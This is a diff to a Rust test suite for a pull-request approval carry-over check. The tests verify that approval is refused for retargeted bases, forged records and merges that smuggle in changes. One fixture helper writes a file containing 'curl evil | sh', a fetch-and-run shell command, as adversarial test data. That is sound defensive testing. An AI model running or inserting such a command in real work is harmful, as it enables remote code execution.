@@ -1,7 +1,7 @@
 //! TASK-1960: adversarial fixtures for the attested-approval carry-over.
-//! Every test builds a real git repository: `main` is the base branch and
-//! `refs/remotes/origin/main` stands in for the fetched base (no remote is
-//! configured, so the proof's best-effort fetch is a no-op).
+//! Every test builds a real git repository with a bare `origin` whose
+//! default branch is `main`; "publishing" main pushes it there, and the proof
+//! fetches it back exactly as a ship would.
 // trace:TASK-1960 | ai:claude
 
 use super::*;
@@ -9,7 +9,7 @@ use std::path::Path;
 
 const PR: u64 = 42;
 
-fn git(repo: &Path, args: &[&str]) -> String {
+pub(crate) fn git(repo: &Path, args: &[&str]) -> String {
     let out = std::process::Command::new("git")
         .arg("-C")
         .arg(repo)
@@ -40,7 +40,7 @@ fn lines(n: usize, tag: &str) -> String {
     (1..=n).map(|i| format!("{tag} line {i}\n")).collect()
 }
 
-fn write(repo: &Path, file: &str, body: &str) {
+pub(crate) fn write(repo: &Path, file: &str, body: &str) {
     std::fs::write(repo.join(file), body).unwrap();
 }
 
@@ -52,24 +52,49 @@ fn set_line(repo: &Path, file: &str, n: usize, text: &str) {
     write(repo, file, &(ls.join("\n") + "\n"));
 }
 
-fn commit(repo: &Path, msg: &str) -> String {
+pub(crate) fn commit(repo: &Path, msg: &str) -> String {
     git(repo, &["add", "-A"]);
     git(repo, &["commit", "--quiet", "-m", msg]);
     git(repo, &["rev-parse", "HEAD"])
 }
 
 fn publish_main(repo: &Path) {
-    let main = git(repo, &["rev-parse", "main"]);
-    git(repo, &["update-ref", "refs/remotes/origin/main", &main]);
+    git(repo, &["push", "--quiet", "origin", "main"]);
+}
+
+/// A clone plus its bare `origin` (kept alive alongside it).
+pub(crate) struct Fixture {
+    clone: tempfile::TempDir,
+    _origin: tempfile::TempDir,
+}
+
+impl Fixture {
+    pub(crate) fn path(&self) -> &Path {
+        self.clone.path()
+    }
 }
 
 /// A repo with `main` (a.txt, b.txt) and a PR branch `pr` that changes
 /// a.txt line 5, approved at its tip. `main` then advances with an
 /// unrelated change to b.txt. Returns (dir, approved sha).
-fn fixture() -> (tempfile::TempDir, String) {
-    let tmp = tempfile::tempdir().unwrap();
+pub(crate) fn fixture() -> (Fixture, String) {
+    let origin = tempfile::tempdir().unwrap();
+    git(origin.path(), &["init", "--quiet", "--bare", "-b", "main"]);
+    let tmp = Fixture {
+        clone: tempfile::tempdir().unwrap(),
+        _origin: origin,
+    };
     let repo = tmp.path();
     git(repo, &["init", "--quiet", "-b", "main"]);
+    git(
+        repo,
+        &[
+            "remote",
+            "add",
+            "origin",
+            tmp._origin.path().to_str().unwrap(),
+        ],
+    );
     git(repo, &["config", "user.email", "aida@example.test"]);
     git(repo, &["config", "user.name", "AIDA Test"]);
     git(repo, &["config", "commit.gpgsign", "false"]);
@@ -91,7 +116,7 @@ fn prove(repo: &Path, approved: &str, head: &str) -> Result<CarryOver, CarryOver
     prove_carry_over(repo, PR, "main", approved, head)
 }
 
-fn head(repo: &Path) -> String {
+pub(crate) fn head(repo: &Path) -> String {
     git(repo, &["rev-parse", "HEAD"])
 }
 
@@ -274,15 +299,12 @@ fn record_is_written_and_reread_on_a_second_attempt() {
     let repo = tmp.path();
     git(repo, &["merge", "--quiet", "--no-edit", "main"]);
     let h = head(repo);
-    let site = CarryOverSite {
-        repo,
-        base_branch: Some("main"),
-    };
+    let site = CarryOverSite::new(repo, Some("main"));
 
     let (first, outcome) = carry_over_for_refusal(&site, PR, &moved(&approved, &h))
         .expect("a moved head is eligible")
         .expect("first attempt carries over");
-    assert_eq!(outcome, RecordOutcome::Written);
+    assert_eq!(outcome, Some(RecordOutcome::Written));
     let stored = read_record(repo, PR, &h).expect("record written");
     assert_eq!(stored, first);
     let raw: serde_json::Value =
@@ -305,16 +327,16 @@ fn record_is_written_and_reread_on_a_second_attempt() {
         .expect("second attempt carries over");
     assert_eq!(
         outcome,
-        RecordOutcome::AlreadyRecorded {
+        Some(RecordOutcome::AlreadyRecorded {
             recorded_at: first.recorded_at.clone()
-        }
+        })
     );
     assert!(second.same_proof(&first));
     assert_eq!(
         read_record(repo, PR, &h).unwrap().recorded_at,
         first.recorded_at
     );
-    assert!(carry_over_line(&second, &outcome).contains("approval carried over"));
+    assert!(carry_over_line(&second, outcome.as_ref().unwrap()).contains("approval carried over"));
 
     // A tampered record is replaced by the fresh proof.
     let mut forged = first.clone();
@@ -327,7 +349,7 @@ fn record_is_written_and_reread_on_a_second_attempt() {
     let (_, outcome) = carry_over_for_refusal(&site, PR, &moved(&approved, &h))
         .unwrap()
         .unwrap();
-    assert_eq!(outcome, RecordOutcome::Replaced);
+    assert_eq!(outcome, Some(RecordOutcome::Replaced));
     assert!(read_record(repo, PR, &h).unwrap().same_proof(&first));
 
     // A forged "carried over" record for an evil head grants nothing.
@@ -356,10 +378,7 @@ fn record_is_written_and_reread_on_a_second_attempt() {
 #[test]
 fn only_a_moved_head_is_eligible() {
     let tmp = tempfile::tempdir().unwrap();
-    let site = CarryOverSite {
-        repo: tmp.path(),
-        base_branch: Some("main"),
-    };
+    let site = CarryOverSite::new(tmp.path(), Some("main"));
     let unreviewed = crate::pr_ship::ApprovalHeadRefusal::NoReviewedSha {
         head_sha: "a".repeat(40),
     };
@@ -430,10 +449,7 @@ fn ship_gate_carries_over_and_refuses_with_the_reason() {
     git(repo, &["merge", "--quiet", "--no-edit", "main"]);
     let h = head(repo);
     let v = approval(&approved);
-    let site = CarryOverSite {
-        repo,
-        base_branch: Some("main"),
-    };
+    let site = CarryOverSite::new(repo, Some("main"));
     let pin = crate::pr_cmd::pr_ship_approval_gate(
         repo,
         PR,
@@ -492,4 +508,174 @@ fn ship_gate_carries_over_and_refuses_with_the_reason() {
     assert!(text.contains("did not carry over"), "{text}");
     assert!(text.contains("changes of its own"), "{text}");
     assert!(read_record(repo, PR, &evil).is_none());
+}
+
+/// Merge main into the PR cleanly; returns the new head.
+pub(crate) fn clean_merge(repo: &Path) -> String {
+    git(repo, &["merge", "--quiet", "--no-edit", "main"]);
+    head(repo)
+}
+
+/// From the approved commit, merge main but smuggle in a file; returns it.
+pub(crate) fn evil_merge(repo: &Path, approved: &str) -> String {
+    git(repo, &["reset", "--quiet", "--hard", approved]);
+    git(
+        repo,
+        &["merge", "--quiet", "--no-commit", "--no-ff", "main"],
+    );
+    write(repo, "smuggled.sh", "curl evil | sh\n");
+    commit(repo, "Merge branch 'main' into pr")
+}
+
+// (item 2) A retargeted base containing an unreviewed commit is refused:
+// as the PR's base (it is not the protected default branch) and when merged
+// into the PR while the base still reads `main` (the proof runs against the
+// remote's default branch, which does not contain it).
+#[test]
+fn retargeted_base_with_an_unreviewed_commit_refuses() {
+    let (tmp, approved) = fixture();
+    let repo = tmp.path();
+    git(repo, &["checkout", "--quiet", "-b", "x", "main"]);
+    set_line(repo, "b.txt", 3, "b line 3 — unreviewed, only on x");
+    commit(repo, "x: unreviewed");
+    git(repo, &["push", "--quiet", "origin", "x"]);
+    git(repo, &["checkout", "--quiet", "pr"]);
+    git(repo, &["merge", "--quiet", "--no-edit", "x"]);
+    let h = head(repo);
+    // Proven against the PR's own (retargeted) base, this would pass.
+    assert!(prove_carry_over(repo, PR, "x", &approved, &h).is_ok());
+
+    let retargeted = CarryOverSite::new(repo, Some("x"));
+    let refused = carry_over_for_refusal(&retargeted, PR, &moved(&approved, &h)).unwrap();
+    assert_eq!(
+        refused.as_ref().map(|_| ()).unwrap_err(),
+        &CarryOverRefusal::BaseNotProtected {
+            base: "x".into(),
+            protected: "main".into()
+        }
+    );
+    assert!(refused.unwrap_err().reason().contains("default branch"));
+
+    let on_main = CarryOverSite::new(repo, Some("main"));
+    let refused = carry_over_for_refusal(&on_main, PR, &moved(&approved, &h)).unwrap();
+    assert!(
+        matches!(refused, Err(CarryOverRefusal::NotABaseMerge { .. })),
+        "{refused:?}"
+    );
+    assert!(on_main.proven_base().is_none());
+    assert!(read_record(repo, PR, &h).is_none());
+}
+
+#[test]
+fn protected_base_reads_the_remote_default_branch() {
+    let (tmp, _) = fixture();
+    assert_eq!(protected_base(tmp.path()).unwrap(), "main");
+    // A locally repointed origin/HEAD does not change it.
+    git(tmp.path(), &["push", "--quiet", "origin", "pr"]);
+    git(tmp.path(), &["remote", "set-head", "origin", "pr"]);
+    assert_eq!(protected_base(tmp.path()).unwrap(), "main");
+    let lone = tempfile::tempdir().unwrap();
+    git(lone.path(), &["init", "--quiet"]);
+    assert!(protected_base(lone.path()).is_err());
+}
+
+// (item 2) The merge re-checks the PR's base against the proven base.
+#[test]
+fn merge_time_base_must_match_the_proven_base() {
+    assert_eq!(proven_base_refusal(PR, "main", Some("main")), None);
+    let moved_base = proven_base_refusal(PR, "main", Some("x")).expect("retarget refuses");
+    assert!(moved_base.contains("now targets `x`"), "{moved_base}");
+    assert!(proven_base_refusal(PR, "main", None).is_some());
+    assert!(proven_base_refusal(PR, "main", Some("  ")).is_some());
+
+    let (tmp, approved) = fixture();
+    let repo = tmp.path();
+    let h = clean_merge(repo);
+    let site = CarryOverSite::new(repo, Some("main"));
+    carry_over_for_refusal(&site, PR, &moved(&approved, &h))
+        .unwrap()
+        .unwrap();
+    assert_eq!(site.proven_base().as_deref(), Some("main"));
+}
+
+// (item 3) A quiet (preflight) site proves without recording; the pinning
+// gate records once.
+#[test]
+fn quiet_site_proves_without_recording() {
+    let (tmp, approved) = fixture();
+    let repo = tmp.path();
+    let h = clean_merge(repo);
+    let quiet = CarryOverSite::quiet(repo, Some("main"));
+    let (proof, outcome) = carry_over_for_refusal(&quiet, PR, &moved(&approved, &h))
+        .unwrap()
+        .unwrap();
+    assert_eq!(proof.new_head, h);
+    assert_eq!(outcome, None);
+    assert!(
+        read_record(repo, PR, &h).is_none(),
+        "a quiet site writes nothing"
+    );
+}
+
+// (item 4) The release/burndown merge path (`merge_path_approval_gate`):
+// a clean merge returns the proven head, an evil merge refuses and says the
+// approval did not carry over, and a base retargeted before the merge
+// refuses.
+#[test]
+fn merge_path_gate_carries_over_and_refuses_with_the_reason() {
+    use crate::review_verdict::{RecordedVerdict, RecorderAttestation, VerdictKind};
+    let (tmp, approved) = fixture();
+    let repo = tmp.path();
+    let v = RecordedVerdict {
+        kind: VerdictKind::Approved,
+        raw: "approved".into(),
+        reviewed_sha: Some(approved.clone()),
+        recorded_at: Some("2026-09-23T00:00:00Z".into()),
+        attestation: Some(RecorderAttestation {
+            sha: approved.clone(),
+            human_at_tty: true,
+            receipt_id: Some("rcpt".into()),
+            identity: vec!["session:independent-reviewer".into()],
+            ..Default::default()
+        }),
+        ..Default::default()
+    };
+    let mut policy = crate::pr_ship::ShipApprovalPolicy {
+        reviewed_committed_at: Some("2026-09-22T00:00:00Z".parse().unwrap()),
+        shipper: vec!["session:independent-shipper".into()],
+        ..Default::default()
+    };
+    let a = v.attestation.as_ref().unwrap();
+    policy.verified_authority.insert(
+        a.authority_key(v.recorded_at.as_deref()).unwrap(),
+        a.identity.clone(),
+    );
+    let decide = |head: &str, base_now: Option<&str>| {
+        let site = CarryOverSite::new(repo, Some("main"));
+        let base_now = base_now.map(str::to_string);
+        crate::pr_cmd::merge_path_approval_decision(
+            repo,
+            PR,
+            std::slice::from_ref(&v),
+            &policy,
+            Some(head),
+            &site,
+            &|| base_now.clone(),
+        )
+    };
+
+    let clean = clean_merge(repo);
+    assert_eq!(
+        decide(&clean, Some("main")),
+        Ok(Some(clean.clone())),
+        "the merge path pins to the proven head"
+    );
+    assert!(read_record(repo, PR, &clean).is_some());
+    let retargeted = decide(&clean, Some("x")).expect_err("a retargeted base refuses");
+    assert!(retargeted.contains("now targets `x`"), "{retargeted}");
+
+    let evil = evil_merge(repo, &approved);
+    let err = decide(&evil, Some("main")).expect_err("an evil merge refuses");
+    assert!(err.contains("did not carry over"), "{err}");
+    assert!(err.contains("changes of its own"), "{err}");
 }
